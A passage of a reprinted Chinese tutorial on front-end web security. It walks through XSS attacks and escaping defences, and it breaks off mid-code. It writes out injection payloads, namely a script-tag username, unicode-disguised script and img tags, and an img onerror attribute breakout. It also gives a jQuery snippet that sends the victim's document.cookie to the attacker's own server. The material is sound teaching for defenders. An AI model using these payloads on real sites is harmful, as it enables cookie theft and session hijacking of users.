---
title: '[聊一聊系列]聊一聊WEB前端安全那些事儿' 
date: 2019-02-05 2:30:09
hidden: true
slug: 90hbpd9kk27
categories: [reprint]
---

{{< raw >}}

                    
<p>欢迎大家收看聊一聊系列，这一套系列文章，可以帮助前端工程师们了解前端的方方面面（不仅仅是代码）：<br><a href="https://segmentfault.com/blog/frontenddriver">https://segmentfault.com/blog...</a></p>
<p>随着互联网的发达，各种WEB应用也变得越来越复杂，满足了用户的各种需求，但是随之而来的就是各种网络安全的问题。作为前端工程师的我们也逃不开这个问题。所以今天，就和大家一起聊一聊WEB前端的安全那些事儿。这里不去说那些后端的攻击(SQL注入、DDOS攻击等)，毕竟整个WEB安全是一门很深的学问，不是我一篇文章就能完全说完的。我们就聊一聊前端工程师们需要注意的那些安全知识。</p>
<h1 id="articleHeader0">为什么要攻击?</h1>
<p>其实真正为了玩的心态去进行黑网站的人，还是少数。多数攻击还是有利益的成分在里面的。我模糊的记得，以前听腾讯的工程师说过一句话，大概是这样的：<strong>开发者不可能确保自己的应用绝对无法被攻击，但是只要攻击我们的时候，黑客花费的成本远比他可以获取的利益大得多，黑客就不会去攻击。</strong>防范强如支付宝、QQ等产品，也都曾被报过漏洞，看来防御不是绝对的，我们只能想办法让我们的应用更加安全。</p>
<h1 id="articleHeader1">前端攻击都有哪些形式，我该如何防范？</h1>
<h2 id="articleHeader2">1 XSS攻击</h2>
<h3 id="articleHeader3">1.1 是什么？</h3>
<p>百度百科中如是说道：<br>XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。<br>其实在web前端方面，可以简单的理解为一种javascript代码注入。举个例子，我们有个社交网站，允许大家相互访问空间，网站可能是这样做的：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<?php
    $username=&quot;侯医生&quot;;
?>
<!DOCYTPE HTML>
<html>
    <head>
        <meta charset=&quot;utf-8&quot; />
    </head>
    <body>
        <div>
            用户名：<?php echo $username;?>
        </div>
        <div>
            第一条状态：侯医生的状态1
        </div>
        <div>
            第二条状态：侯医生的状态2
        </div>
        <div>
            第三条状态：侯医生的状态3
        </div>
    </body>
</html>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs xml"><code><span class="php"><span class="hljs-meta">&lt;?php</span>
    $username=<span class="hljs-string">"侯医生"</span>;
<span class="hljs-meta">?&gt;</span></span>
<span class="hljs-tag">&lt;<span class="hljs-name">!DOCYTPE</span> <span class="hljs-attr">HTML</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            用户名：<span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> $username;<span class="hljs-meta">?&gt;</span></span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            第一条状态：侯医生的状态1
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            第二条状态：侯医生的状态2
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            第三条状态：侯医生的状态3
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
<p>运行时，展现形式如图1.1.1所示：</p>
<p><span class="img-wrap"><img data-src="/img/bVB9cO" src="https://static.alili.tech/img/bVB9cO" alt="clipboard.png" title="clipboard.png" style="cursor: pointer;"></span><br>图1.1.1</p>
<p>但是，如果你的用户名，起名称的时候，带上script标签呢？我们知道，浏览器遇到html中的script标签的时候，会解析并执行标签中的js脚本代码，那么如果你的用户名称里面含有script标签的话，就可以执行其中的代码了。<br>代码如下，效果如图1.1.2</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<?php
    $username=&quot;<script>alert('侯医生');</script>&quot;;
?>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs xml"><code><span class="php"><span class="hljs-meta">&lt;?php</span>
    $username=<span class="hljs-string">"&lt;script&gt;alert('侯医生');&lt;/script&gt;"</span>;
<span class="hljs-meta">?&gt;</span></span></code></pre>
<p><span class="img-wrap"><img data-src="/img/bVB9or" src="https://static.alili.tech/img/bVB9or" alt="clipboard.png" title="clipboard.png" style="cursor: pointer;"></span><br>图1.1.2<br>如果你将自己的用户名设定为这种执行脚本的方式，再让别人去访问你的连接的话，就可以达到在他人web环境中，执行自己脚本的效果了。我们还可以使用ajax，将其他用户在当前域名下的cookie获取并发送到自己的服务器上。这样就可以获取他人信息了。比如，刚刚咱们使用的不是alert而是，如下的代码：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="$.ajax({
    url: '自己的服务器',
    dataType: 'jsonp',
    data: {'盗取的用户cookie': document.cookie}
});" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs javascript"><code>$.ajax({
    <span class="hljs-attr">url</span>: <span class="hljs-string">'自己的服务器'</span>,
    <span class="hljs-attr">dataType</span>: <span class="hljs-string">'jsonp'</span>,
    <span class="hljs-attr">data</span>: {<span class="hljs-string">'盗取的用户cookie'</span>: <span class="hljs-built_in">document</span>.cookie}
});</code></pre>
<p>再在各个QQ群中，散播自己的空间，引诱别人来访问。就可以拿到用户在这个域名下的cookie或者其他隐私了。</p>
<h3 id="articleHeader4">1.2 如何防范？</h3>
<p>目前来讲，最简单的办法防治办法，还是将前端输出数据都进行转义最为稳妥。比如，按照刚刚我们那个例子来说，其本质是，浏览器遇到script标签的话，则会执行其中的脚本。但是如果我们将script标签的进行转义，则浏览器便不会认为其是一个标签，但是显示的时候，还是会按照正常的方式去显示，代码如下，效果如图1.2.1</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<?php
    $username=&quot;<script>alert('侯医生');</script>&quot;;
?>
<!DOCYTPE HTML>
<html>
    <head>
        <meta charset=&quot;utf-8&quot; />
    </head>
    <body>
        <!--我们将输出的后端变量，转义之后再输出，则可以避免被注入代码-->
        <div>
            用户名：<?php echo htmlentities($username);?>
        </div>
        <div>
            第一条状态：侯医生的状态1
        </div>
        <div>
            第二条状态：侯医生的状态2
        </div>
        <div>
            第三条状态：侯医生的状态3
        </div>
    </body>
</html>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs xml"><code><span class="php"><span class="hljs-meta">&lt;?php</span>
    $username=<span class="hljs-string">"&lt;script&gt;alert('侯医生');&lt;/script&gt;"</span>;
<span class="hljs-meta">?&gt;</span></span>
<span class="hljs-tag">&lt;<span class="hljs-name">!DOCYTPE</span> <span class="hljs-attr">HTML</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        <span class="hljs-comment">&lt;!--我们将输出的后端变量，转义之后再输出，则可以避免被注入代码--&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            用户名：<span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> htmlentities($username);<span class="hljs-meta">?&gt;</span></span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            第一条状态：侯医生的状态1
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            第二条状态：侯医生的状态2
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            第三条状态：侯医生的状态3
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
<p><span class="img-wrap"><img data-src="/img/bVB9qd" src="https://static.alili.tech/img/bVB9qd" alt="clipboard.png" title="clipboard.png" style="cursor: pointer;"></span><br>图1.2.1<br>其实，我们再来看看网页源码，如图1.2.2<br><span class="img-wrap"><img data-src="/img/bVB9qG" src="https://static.alili.tech/img/bVB9qG" alt="clipboard.png" title="clipboard.png" style="cursor: pointer;"></span><br>图1.2.2<br>虽然显示出来是有script标签的，但是实际上，script标签的左右尖括号(&gt;&lt;)，均被转义为html字符实体，所以，便不会被当做标签来解析的，但是实际显示的时候，这两个尖括号，还是可以正常展示的。</p>
<h3 id="articleHeader5">1.3 升级攻击</h3>
<h4>1.3.1 append的利用</h4>
<p>上一小节我们防住了script标签的左右尖括号，蓝鹅，聪明的黑客们还是想出了好办法去破解，我们知道，直接给innerHTML赋值一段js，是无法被执行的。比如，</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="$('div').innerHTML = '<script>alert(&quot;okok&quot;);</script>';" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs xml"><code style="word-break: break-word; white-space: initial;">$('div').innerHTML = '<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">alert(<span class="hljs-string">"okok"</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>';</code></pre>
<p>但是，jquery的append可以做到，究其原因，就是因为jquery会在将append元素变为fragment的时候，找到其中的script标签，再使用eval执行一遍。jquery的append使用的方式也是innerHTML(如图1.3.1.1)。而innerHTML是会将unicode码转换为字符实体的。<br><span class="img-wrap"><img data-src="/img/bVB9t0" src="https://static.alili.tech/img/bVB9t0" alt="clipboard.png" title="clipboard.png" style="cursor: pointer;"></span><br>图1.3.1.1<br>利用这两种知识结合，我们可以得出，网站使用append进行dom操作，如果是append我们可以决定的字段，那么我们可以将左右尖括号，使用unicode码伪装起来，就像这样--<code>"\u003cscript\u003ealert('okok');"</code>。接下来转义的时候，伪装成<code>\u003</code>的<code>&lt;</code>会被漏掉，append的时候，则会被重新调用。代码如下，效果如图1.3.1.2</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<?php
    $username=&quot;\u003cscript\u003ealert('okok');&quot;;
?>
<!DOCYTPE HTML>
<html>
    <head>
        <meta charset=&quot;utf-8&quot; />
        <script src=&quot;https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js&quot;></script>
    </head>
    <body>
        <div>
            用户名：<?php echo htmlentities($username);?>
        </div>
        <div>
            第一条状态：侯医生的状态1
        </div>
        <div>
            第二条状态：侯医生的状态2
        </div>
        <div>
            第三条状态：侯医生的状态3
        </div>
        <div>版权所有：<span id=&quot;username_info&quot;></span></div>
        <script>
            $('#username_info').append(&quot;<?php echo htmlentities($username);?>&quot;);
        </script>
    </body>
</html>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs xml"><code><span class="php"><span class="hljs-meta">&lt;?php</span>
    $username=<span class="hljs-string">"\u003cscript\u003ealert('okok');"</span>;
<span class="hljs-meta">?&gt;</span></span>
<span class="hljs-tag">&lt;<span class="hljs-name">!DOCYTPE</span> <span class="hljs-attr">HTML</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            用户名：<span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> htmlentities($username);<span class="hljs-meta">?&gt;</span></span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            第一条状态：侯医生的状态1
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            第二条状态：侯医生的状态2
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            第三条状态：侯医生的状态3
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>版权所有：<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"username_info"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="handlebars"><span class="xml">
            $('#username_info').append("<span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> htmlentities($username);<span class="hljs-meta">?&gt;</span></span>");
        </span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
<p><span class="img-wrap"><img data-src="/img/bVB9uu" src="https://static.alili.tech/img/bVB9uu" alt="clipboard.png" title="clipboard.png" style="cursor: pointer;"></span><br>图1.3.1.2<br>我们可以看到，虽然进行了转义，注入的代码还是会再次被执行。</p>
<h4>1.3.2 img标签的再次利用</h4>
<p>再来一种攻击方式，img标签的小贴士。<br>这里我们需要重温一个小知识点-----img标签，在加载图片失败的时候，会调用该元素上的onerror事件。我们正可以利用这种方式来进行攻击。我们先来看一下，正常的用户分享图片的行为怎么做。代码如下，展示如图1.3.2.1</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<?php
    $username=&quot;<script>alert('侯医生');</script>&quot;;
    $imgsrc=&quot;http://img5.imgtn.bdimg.com/it/u=1412369044,967882675&amp;fm=11&amp;gp=0.jpg&quot;;
?>
<!DOCYTPE HTML>
<html>
    <head>
        <meta charset=&quot;utf-8&quot; />
    </head>
    <body>
        <div>
            用户名：<?php echo htmlentities($username);?>
        </div>
        <div>
            第一条状态：侯医生的状态1，这个是图片：
            <img src=&quot;<?php echo $imgsrc;?>&quot; />
        </div>
        <div>
            第二条状态：侯医生的状态2
        </div>
        <div>
            第三条状态：侯医生的状态3
        </div>
    </body>
</html>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs xml"><code><span class="php"><span class="hljs-meta">&lt;?php</span>
    $username=<span class="hljs-string">"&lt;script&gt;alert('侯医生');&lt;/script&gt;"</span>;
    $imgsrc=<span class="hljs-string">"http://img5.imgtn.bdimg.com/it/u=1412369044,967882675&amp;fm=11&amp;gp=0.jpg"</span>;
<span class="hljs-meta">?&gt;</span></span>
<span class="hljs-tag">&lt;<span class="hljs-name">!DOCYTPE</span> <span class="hljs-attr">HTML</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            用户名：<span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> htmlentities($username);<span class="hljs-meta">?&gt;</span></span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            第一条状态：侯医生的状态1，这个是图片：
            <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"&lt;?php echo $imgsrc;?&gt;"</span> /&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            第二条状态：侯医生的状态2
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            第三条状态：侯医生的状态3
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
<p><span class="img-wrap"><img data-src="/img/bVB9rR" src="https://static.alili.tech/img/bVB9rR" alt="clipboard.png" title="clipboard.png" style="cursor: pointer; display: inline;"></span><br>图1.3.2.1<br>但是，如果这张图片的地址我们换种写法呢？</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<?php
    $imgsrc=&quot;\&quot; onerror=\&quot;javascript:alert('侯医生');\&quot;&quot;;
?>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs xml"><code><span class="php"><span class="hljs-meta">&lt;?php</span>
    $imgsrc=<span class="hljs-string">"\" onerror=\"javascript:alert('侯医生');\""</span>;
<span class="hljs-meta">?&gt;</span></span></code></pre>
<p>我们再来看看拼装好的html源码，如图1.3.2.2：<br><span class="img-wrap"><img data-src="/img/bVB9r2" src="https://static.alili.tech/img/bVB9r2" alt="clipboard.png" title="clipboard.png" style="cursor: pointer;"></span><br>图1.3.2.2<br>这时的源码已经变为--src为空，但是onerror的时候，执行注入代码。我们刷新查看页面，就会发现，代码注入已经成功，如图1.3.2.3所示：<br><span class="img-wrap"><img data-src="/img/bVB9sh" src="https://static.alili.tech/img/bVB9sh" alt="clipboard.png" title="clipboard.png" style="cursor: pointer;"></span><br>图1.3.2.3<br>看官你可能会说了，再转义呗。是的，老套路，我们接着进行转义---你这个毛病呀，就算治好了(老中医口吻)。</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<img src=&quot;<?php echo htmlentities($imgsrc);?>&quot; />" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs stylus"><code style="word-break: break-word; white-space: initial;">&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"&lt;?php echo htmlentities($imgsrc);?&gt;"</span> /&gt;</code></pre>
<p>恩，总算是恢复正常了，如图1.3.2.4所示。<br><span class="img-wrap"><img data-src="/img/bVB9uC" src="https://static.alili.tech/img/bVB9uC" alt="clipboard.png" title="clipboard.png" style="cursor: pointer;"></span><br>图1.3.2.4</p>
<h4>1.3.3 组合使用</h4>
<p>但是......但是，道高一尺魔高一丈，虽然防住了img标签直接的输出，但是我们的攻击点又来了，我们将1.3.1中所说的方式与1.3.2中所说的方式进行结合，进行一种组合式攻击，我们之前说过，innerHTML赋值的script标签，不会被执行，但是innerHTML赋值一个img标签是可以被识别的。我们把img标签的左右尖括号，使用unicode进行伪装，让转义方法认不出来，即使innerHTML也可以利用上了，代码如下，效果如图1.3.3.1</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<?php
    $username=&quot;\u003cimg src=\'\' onerror=javascript:alert(\'okok\');\u003e&quot;;
?>
<!DOCYTPE HTML>
<html>
    <head>
        <meta charset=&quot;utf-8&quot; />
    </head>
    <body>
        <div>
            用户名：<?php echo htmlentities($username);?>
        </div>
        <div>
            第一条状态：侯医生的状态1
        </div>
        <div>
            第二条状态：侯医生的状态2
        </div>
        <div>
            第三条状态：侯医生的状态3
        </div>
        <div>版权所有：<span id=&quot;username_info&quot;></span></div>
        <script>
            document.getElementById('username_info').innerHTML = &quot;<?php echo htmlentities($username);?>&quot;;
        </script>
    </body>
</html>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs xml"><code><span class="php"><span class="hljs-meta">&lt;?php</span>
    $username=<span class="hljs-string">"\u003cimg src=\'\' onerror=javascript:alert(\'okok\');\u003e"</span>;
<span class="hljs-meta">?&gt;</span></span>
<span class="hljs-tag">&lt;<span class="hljs-name">!DOCYTPE</span> <span class="hljs-attr">HTML</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            用户名：<span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> htmlentities($username);<span class="hljs-meta">?&gt;</span></span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            第一条状态：侯医生的状态1
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            第二条状态：侯医生的状态2
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            第三条状态：侯医生的状态3
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>版权所有：<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"username_info"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="handlebars"><span class="xml">
            document.getElementById('username_info').innerHTML = "<span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> htmlentities($username);<span class="hljs-meta">?&gt;</span></span>";
        </span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
<p><span class="img-wrap"><img data-src="/img/bVB9vc" src="https://static.alili.tech/img/bVB9vc" alt="clipboard.png" title="clipboard.png" style="cursor: pointer;"></span><br>图1.3.3.1<br>这样，innerHTML也可以派上用场，再次突破防线。</p>
<h3 id="articleHeader6">1.4 升级防御</h3>
<p>看来，我们需要再次进行防御升级了，我们将输出的字符串中的<code>\</code>反斜杠进行转义(json转义)。这样，<code>\</code>就不会被当做unicode码的开头来被处理了。代码如下：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="document.getElementById('username_info').innerHTML = <?php echo json_encode(htmlentities($username));?>;" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs javascript"><code style="word-break: break-word; white-space: initial;"><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'username_info'</span>).innerHTML = <span class="xml"><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> json_encode(htmlentities($username));<span class="hljs-meta">?&gt;</span></span>;</span></code></pre>
<p>生成处的源码，如图1.4.1<br><span class="img-wrap"><img data-src="/img/bVB9wd" src="https://static.alili.tech/img/bVB9wd" alt="clipboard.png" title="clipboard.png" style="cursor: pointer;"></span><br>图1.4.1<br>效果如图1.4.2所示<br><span class="img-wrap"><img data-src="/img/bVB9wf" src="https://static.alili.tech/img/bVB9wf" alt="clipboard.png" title="clipboard.png" style="cursor: pointer;"></span><br>图1.4.2</p>
<h3 id="articleHeader7">1.5 XSS再升级</h3>
<p>都说了道高一尺魔高一丈了，你以为防得住后端输出，黑客大大们就没办法攻击了吗。我们有的时候，会有一些习惯，拿URL上的get参数去构建网页。好比说，直接拿url上的用户名去展示啦，拿url上的一些回跳地址之类的。但是url上的参数，我们是无法提前对其进行转义的。接下来，来个例子，代码如下：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<html>
    <head>
        <meta charset=&quot;utf-8&quot; />
        <script src=&quot;https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js&quot;></script>
    </head>
    <body>
        <div>
            用户名：<?php echo htmlentities($username);?>
        </div>
        <div>
            第一条状态：侯医生的状态1
        </div>
        <div>
            第二条状态：侯医生的状态2
        </div>
        <div>
            第三条状态：侯医生的状态3
        </div>
